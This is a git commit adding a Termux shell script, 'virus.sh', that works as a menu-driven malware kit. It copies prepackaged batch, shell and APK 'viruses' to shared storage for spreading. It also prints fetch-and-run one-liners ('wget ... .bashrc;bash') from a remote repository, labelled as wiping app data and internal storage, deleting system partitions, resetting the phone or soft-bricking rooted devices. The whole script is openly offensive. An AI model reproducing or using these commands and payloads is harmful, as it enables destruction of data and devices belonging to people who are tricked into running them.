c79b59daac15be93e1e007a06e884380577d2985
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2019-11-20 13:00:02 +0530

    Add files via upload

---
+++ virus.sh
@@ -0,0 +1,543 @@
+bat_i() {
+	
+	
+	figlet Batch | toilet -f term -F gay
+	
+	}
+	
+	command_i() {
+		
+	
+	
+	figlet Command | toilet -f term -F gay
+	
+	}
+	
+	shell() {
+	
+	
+	figlet shell | toilet -f term -F gay
+	
+	}
+		
+		
+		
+bat() {
+	
+	clear
+	
+echo
+lal="\033[91m"
+pila="\033[93m"
+ajib="\033[96m"
+echo
+figlet batch|toilet -F gay -f term
+echo
+echo -e "	$lal[ 1 ]$ajib RIP.."
+echo -e "	$lal[ 2 ]$ajib Sleepy"
+echo -e "	$lal[ 3 ]$ajib Danger"
+echo -e "	$lal[ 4 ]$ajib start.."
+echo -e "	$lal[ 5 ]$ajib Back"
+echo -e "	$lal[ 6 ]$ajib Exit"
+echo
+echo -e -n "$ajib select >> "
+read a
+echo -e "$pila"
+if [ "$a" = "1" ];then
+cd $PREFIX/Virus
+cp -f Rip.bat /sdcard/Virus
+echo -e "$pila [-] Downloading Rip......"
+sleep 2
+echo " [√] Download success"
+echo
+sleep 1
+echo "Checking......"
+sleep 1
+echo
+cd /sdcard/Virus
+ls
+echo
+echo
+pwd
+echo
+bat_i
+echo
+echo "Press enter to home"
+read
+virus
+fi
+if [ "$a" = "2" ];then
+clear
+cd $PREFIX/Virus
+cp  -f sleepy.bat /sdcard/Virus
+echo -e "$pila [-] Downloading sleepy......"
+sleep 2
+echo " [√] Download success"
+echo
+sleep 1
+echo "Checking......"
+sleep 1
+echo
+cd /sdcard/Virus
+ls
+echo
+echo
+pwd
+echo
+echo
+bat_i
+echo
+
+echo "Press enter to home"
+read
+virus
+fi
+if [ "$a" = "3" ];then
+clear
+cd $PREFIX/Virus
+cp -f Danger* /sdcard/Virus
+echo -e "$pila [-] Downloading Danger......"
+sleep 2
+echo " [√] Download success"
+echo
+sleep 1
+echo "Checking......"
+sleep 1
+echo
+cd /sdcard/Virus
+ls
+echo
+echo
+pwd
+echo
+echo
+bat_i
+echo
+echo "Press enter to home"
+read
+virus
+fi
+if [ "$a" = "4" ];then
+clear
+cd $PREFIX/Virus
+cp -f start.bat /sdcard/Virus
+echo -e "$pila [-] Downloading start......"
+sleep 2
+echo " [√] Download success"
+echo
+sleep 1
+echo "Checking......"
+sleep 1
+echo
+cd /sdcard/Virus
+ls
+echo
+echo
+pwd
+echo
+
+echo
+bat_i
+echo
+echo "Press enter to home"
+read
+virus
+fi
+if [ "$a" = "5" ];then
+virus
+fi
+
+
+}
+
+
+	command() {
+	
+	clear
+echo
+echo
+figlet Command | toilet -f term -F gay
+echo
+lal="\033[91m"
+pila="\033[93m"
+hara="\033[92m"
+echo -e "	$hara [ 1 ]$pila Termux Date clear"
+echo -e "	$hara [ 2 ]$pila Internal storage clear"
+echo -e "	$hara [ 3 ]$pila Internal Storage and Termux Clear"
+echo -e "	$hara [ 4 ]$pila Reset phone$lal ( root )"
+echo -e "	$hara [ 5 ]$pila System delete$lal ( root )"
+echo -e "	$hara [ 6 ]$pila Dev delete$lal ( root )"
+echo -e "	$hara [ 7 ]$pila Soft brick phone$lal ( root )"
+echo -e "	$hara [ 8 ]$pila Home"
+echo -e "	$hara [ 9 ]$pila Exit"
+echo
+echo -e -n "$hara select >> "
+read a
+echo -e "$pila"
+if [ "$a" = "1" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Termux/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "2" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Sdcard/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "3" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Asdcard/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "4" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Data/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "5" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/System/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "6" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Dev/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "7" ];then
+clear
+echo
+echo
+echo
+echo
+echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Asystem/.bashrc;bash"
+echo
+echo
+echo
+echo
+echo "pess enter to home"
+read
+virus
+fi
+if [ "$a" = "8" ];then
+clear
+virus
+fi
+
+
+}
+
+	
+	shell() {
+	
+	clear
+echo
+echo
+figlet SHELL | toilet -f term -F gay
+echo
+lal="\033[91m"
+pila="\033[93m"
+hara="\033[92m"
+echo -e "	$hara [ 1 ]$pila Termux Date clear"
+echo -e "	$hara [ 2 ]$pila Internal storage clear"
+echo -e "	$hara [ 3 ]$pila Internal Storage and Termux Clear"
+echo -e "	$hara [ 4 ]$pila Reset phone$lal ( root )"
+echo -e "	$hara [ 5 ]$pila System delete$lal ( root )"
+echo -e "	$hara [ 6 ]$pila Dev delete$lal ( root )"
+echo -e "	$hara [ 7 ]$pila Soft brick phone$lal ( root )"
+echo -e "	$hara [ 8 ]$pila Home"
+echo -e "	$hara [ 9 ]$pila Exit"
+echo
+echo -e -n "$hara select >> "
+read a
+echo -e "$pila"
+cd $PREFIX/Virus
+if [ "$a" = "1" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f Termux.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+sleep 1
+echo
+cd /sdcard/Virus
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "2" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f Sdcard.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+sleep 1
+cd /sdcard/Virus
+echo
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "3" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f Asdcard.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+sleep 1
+cd /sdcard/Virus
+echo
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "4" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f Data.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+sleep 1
+cd /sdcard/Virus
+echo
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "5" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f System.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+cd /sdcard/Virus
+sleep 1
+echo
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "6" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f Dev.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+sleep 1
+cd /sdcard/Virus
+echo
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "7" ];then
+clear
+echo "Creating.............."
+sleep 2
+cp -f Asystem.sh /sdcard/Virus
+echo "Success"
+echo
+sleep 2
+echo "Checking......."
+sleep 1
+echo
+cd /sdcard/Virus
+ls
+echo
+echo
+pwd
+fi
+if [ "$a" = "8" ];then
+virus
+fi
+}
+	
+virus2 () {
+	
+
+clear
+lal="\033[91m"
+figlet Virus | toilet -f term -F gay
+echo
+echo -e "	\033[91m [ 1 ]\033[93m Elite.apk "
+echo -e "	\033[91m [ 2 ]\033[93m Shell virus$lal ( 9)"
+echo -e "	\033[91m [ 3 ]\033[93m Batch virus$lal ( 6 )"
+echo -e "	\033[91m [ 4 ]\033[93m Command Virus$lal ( 9 )"
+echo -e "	\033[91m [ 5 ]\033[93m Update Tool"
+echo -e "	\033[91m [ 4 ]\033[93m Exit"
+echo 
+
+echo -e "\033[92m  	[+] Checking Current Version :- V1.2"
+wget https://raw.githubusercontent.com/rooted-cyber/Virus-Making/master/up.txt > /dev/null 2>&1
+cat up.txt
+rm -f up.txt
+echo
+echo
+echo -e -n "\033[96m Select >> "
+read a
+if [ "$a" = "1" ];then
+clear
+cd $PREFIX/Virus
+cp -f .Elite.apk /sdcard/Virus
+cd /sdcard/Virus
+mv .Elite.apk Elite.apk
+echo -e "\033[93m Downloading Elite.apk......"
+sleep 5
+echo "Download Success"
+sleep 2
+echo "Checking......"
+sleep 2
+cd /sdcard/Virus
+echo
+ls
+echo
+echo
+pwd
+echo
+echo "Press enter for Home"
+read
+cd $PREFIX/Virus
+bash .vir.sh
+fi
+if [ "$a" = "2" ];then
+shell
+fi
+if [ "$a" = "3" ];then
+bat
+fi
+if [ "$a" = "4" ];then
+command
+fi
+if [ "$a" = "5" ];then
+clear
+echo -e "$lal	[+] Updating ......"
+echo
+sleep 2
+cd $PREFIX
+rm -rf Virus
+apt install git
+cd $HOME
+rm -rf Virus-Making
+git clone https://github.com/rooted-cyber/Virus-Making
+cd Virus-Making
+bash setup.sh
+fi
+}
+setup() {
+	
+	clear
+apt update
+apt upgrade
+apt install figlet
+apt install wget
+apt install toilet
+clear
+termux-setup-storage
+mkdir $PREFIX/Virus
+cp -f bat.zip $PREFIX/Virus
+cp -f shell.zip $PREFIX/Virus
+cp -f .Elite.apk $PREFIX/Virus
+mkdir /sdcard/Virus
+cd $PREFIX/Virus
+unzip bat.zip
+unzip shell.zip
+cd ~/Virus-Making
+cp -f virus $PREFIX/bin
+chmod 777 $PREFIX/bin/virus
+cd ~/Virus-Making
+rm -Rf *
+mv .v.sh virus.sh
+clear
+echo -e "\033[93m You can start this command :- virus"
+
+}
+echo -e -n "\033[92m Starting Setup\033[91m (\033[96Y/N\033[91m) "
+read v
+case $v in
+y|Y)setup ;;
+n|N)virus2 ;;
+esac
